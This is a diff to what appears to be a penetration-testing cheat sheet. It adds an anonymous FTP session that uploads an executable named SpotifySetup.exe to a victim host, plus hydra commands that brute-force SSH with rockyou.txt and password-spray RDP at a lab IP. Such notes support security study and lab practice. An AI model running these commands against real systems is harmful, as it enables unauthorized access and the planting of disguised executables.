@@ -1,6 +1,17 @@
 
 # Misc
 
+##### Use active mode, binary transfer, put .exe on Linux
+```bash
+ftp <victim_IP>
+# Login as anonymous; no pw
+ftp> passive
+	Passive mode: off; fallback to active mode: off
+ftp> binary
+	200 Type set to I.
+ftp> put SpotifySetup.exe
+```
+
 ##### Sample files for exploits (.jpgs, .ico, .bmp, .png, .txt, etc)
 ```bash
 ls /var/lib/inetsim/http/fakefiles/
@@ -984,3 +995,14 @@ https://canarytokens.com
 
 ## MS Office
 
+# Password Attacks
+
+##### Attack SSH using rockyou.txt
+```bash
+hydra -l <user> -P /usr/share/wordlists/rockyou.txt -s <port> ssh://<IP>
+```
+
+##### Spray Attack RDP
+```bash
+hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
+```
